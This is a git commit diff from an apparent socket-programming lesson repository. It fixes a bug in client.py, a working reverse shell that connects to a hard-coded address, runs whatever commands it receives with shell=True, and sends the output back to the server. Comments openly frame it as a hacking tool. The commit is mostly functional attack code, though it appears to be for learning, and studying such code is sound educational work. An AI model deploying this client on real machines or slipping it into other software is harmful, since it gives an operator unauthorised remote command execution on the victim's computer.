f407b1f0331f5ab15dbaf86a8638184fa7988f26
c-l-scholl <cscholl@macalester.edu>
2024-01-04 13:37:42 -0800

    fixed bug with client having concatonated bytes and string

--- socket-lesson/client.py
+++ socket-lesson/client.py
@@ -5,31 +5,30 @@ import subprocess
 # Personal CPU's IPs are private and dynamic
 # reverse shell, target connects to us
 # this connects to the server
-def main():
-	host = '192.168.84.20'
-	port = 9999 # don't choose a common one
-	s = socket.socket()
-	s.connect((host, port))
 
-	while True:
-		data = s.recv(1024)
-		if data[:2].decode('utf-8') == 'cd':
-			os.chdir(data[3:].decode('utf-8')) # use 3: to avoid space
+host = '192.168.84.20'
+port = 9999 # don't choose a common one
+s = socket.socket()
+s.connect((host, port))
 
-		# if there is text, send to normal stream
-		if len(data) > 0:
-			cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-			# want string and byte for human and computer readability
-			output_bytes = cmd.stdout.read() + cmd.stderr.read()
-			output_str = str(output_bytes, 'utf-8')
+while True:
+	data = s.recv(1024)
+	if data[:2].decode('utf-8') == 'cd':
+		os.chdir(data[3:].decode('utf-8')) # use 3: to avoid space
 
-			# returns command and cwd (Nice!)
-			s.send(str.encode(output_str + str(os.getcwd)) + '> ')
+	# if there is text, send to normal stream
+	if len(data) > 0:
+		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		# want string and byte for human and computer readability
+		output_bytes = cmd.stdout.read() + cmd.stderr.read()
+		output_str = str(output_bytes, 'utf-8')
 
-			# prints on client machine, so don't do this if hacking
-			print(output_str)
+		# returns command and cwd (Nice!)
+		s.send(str.encode(output_str + str(os.getcwd()) + '> '))
 
-	# close connection
-	s.close()
+		# prints on client machine, so don't do this if hacking
+		print(output_str)
 
-main()
+# close connection
+s.close()
+
--- socket-lesson/server.py
+++ socket-lesson/server.py
@@ -54,8 +54,8 @@ def send_commands(conn):
 			sys.exit()
 		if len(str.encode(cmd)) > 0:
 			conn.send(str.encode(cmd))
-			client_response = str(conn.recv(1024), "utf-8")
-			print(client_response, end = "")
+			client_response = str(conn.recv(1024), 'utf-8')
+			print(client_response, end = '')
 
 def main():
 	socket_create()
